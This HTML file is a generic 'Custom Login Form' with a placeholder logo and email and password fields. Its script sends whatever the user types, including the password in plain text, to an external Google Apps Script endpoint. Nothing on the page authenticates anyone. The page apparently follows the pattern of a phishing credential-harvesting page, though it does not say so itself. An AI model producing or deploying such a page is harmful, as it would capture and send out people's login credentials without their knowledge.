<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom Login Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .login-container {
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 50px;
            height: 50px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: calc(100% - 22px);
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .form-group label {
            display: block;
            text-align: left;
            font-weight: bold;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #1e88e5;
            border: none;
            color: #ffffff;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .submit-btn:hover {
            background-color: #0d47a1;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/150x150.png?text=Unique+Logo" alt="Logo">
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="submit-btn">Sign In</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(e.target);
            const data = {};
            formData.forEach((value, key) => data[key] = value);
            fetch('https://script.google.com/macros/s/AKfycbzMvzY3LrkZBIVIjyTYkNus73bpOa_YTcpUPfL2wOOP5HvFu1bLO31hsRAfdmejNOQa7A/exec', {
                method: 'POST',
                body: JSON.stringify(data),
                headers: {
                    'Content-Type': 'application/json',
                },
            }).then(response => response.json())
              .then(data => {
                  console.log('Success:', data);
                  alert('Form submitted successfully!');
              })
              .catch((error) => {
                  console.error('Error:', error);
                  alert('Error submitting the form');
              });
        });
    </script>
</body>
</html>
